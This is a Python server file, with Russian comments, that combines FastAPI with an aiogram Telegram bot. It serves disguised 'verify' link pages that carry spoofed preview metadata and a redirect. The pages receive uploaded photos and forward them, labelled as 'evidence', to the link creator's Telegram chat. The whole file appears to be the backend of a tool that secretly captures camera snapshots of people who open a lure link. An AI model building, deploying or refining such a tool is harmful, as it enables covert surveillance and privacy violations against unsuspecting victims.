import asyncio
import logging
import os
from fastapi import FastAPI, Request, UploadFile, File, BackgroundTasks
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from aiogram.types import BufferedInputFile, Update
import uvicorn

# Импортируем конфиг и бота
from config import bot, dp
from database import load_links

# Импортируем роутеры
from admin import router as admin_router
from bot_handlers import router as client_router

# Настройка логирования
logging.basicConfig(level=logging.INFO)

app = FastAPI()
templates = Jinja2Templates(directory="templates")

WEBHOOK_URL = os.getenv("WEBHOOK_URL")  # Например: https://my-bot.onrender.com/webhook

# --- ФОНОВАЯ ЗАДАЧА ---

async def send_photo_to_telegram(chat_id: int, photo_bytes: bytes, link_id: str):
    """
    Отправляет фото владельцу ссылки.
    """
    try:
        photo_file = BufferedInputFile(photo_bytes, filename=f"evidence_{link_id}.jpg")
        await bot.send_photo(
            chat_id=chat_id, 
            photo=photo_file, 
            caption=f"✅ <b>Снимок получен!</b>\n🔗 ID ссылки: <code>{link_id}</code>",
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"Ошибка при отправке фото в Telegram: {e}")

# --- ЛОГИКА СЕРВЕРА ---

@app.post("/webhook")
async def bot_webhook(update: dict):
    telegram_update = Update(**update)
    await dp.feed_update(bot, telegram_update)
    return {"status": "ok"}

@app.get("/verify/{link_id}", response_class=HTMLResponse)
async def get_page(request: Request, link_id: str):
    links = load_links()
    
    if link_id not in links:
        return HTMLResponse("<h1>Ссылка недействительна или устарела</h1>", status_code=404)
    
    link_data = links[link_id]
    redirect_url = link_data.get("redirect_url", "https://google.com")
    meta = link_data.get("meta", {})
    
    return templates.TemplateResponse("index.html", {
        "request": request, 
        "link_id": link_id, 
        "redirect_url": redirect_url,
        "meta_title": meta.get("title", ""),
        "meta_desc": meta.get("description", ""),
        "meta_image": meta.get("image", "")
    })

@app.post("/upload/{link_id}")
async def upload_photo(link_id: str, background_tasks: BackgroundTasks, file: UploadFile = File(...)):
    links = load_links()
    
    if link_id not in links:
        return {"status": "error", "message": "Link invalid"}

    owner_id = links[link_id].get("owner_id")
    if not owner_id:
        return {"status": "error", "message": "Owner not found"}

    # Читаем файл
    photo_bytes = await file.read()
    
    # Отправляем в телеграм (фоном)
    background_tasks.add_task(send_photo_to_telegram, owner_id, photo_bytes, link_id)
    
    return {"status": "success"}

# --- ЗАПУСК ---

@app.on_event("startup")
async def on_startup():
    # Регистрируем роутеры aiogram
    dp.include_router(admin_router)
    dp.include_router(client_router)
    
    # Настройка Webhook или Polling
    if WEBHOOK_URL:
        print(f"Using Webhook: {WEBHOOK_URL}/webhook")
        await bot.delete_webhook(drop_pending_updates=True)
        await bot.set_webhook(f"{WEBHOOK_URL}/webhook")
    else:
        print("WEBHOOK_URL not set. Using Polling (NOT recommended for production).")
        await bot.delete_webhook(drop_pending_updates=True)
        asyncio.create_task(dp.start_polling(bot))

if __name__ == "__main__":
    # Запуск сервера
    uvicorn.run(app, host="0.0.0.0", port=3000)
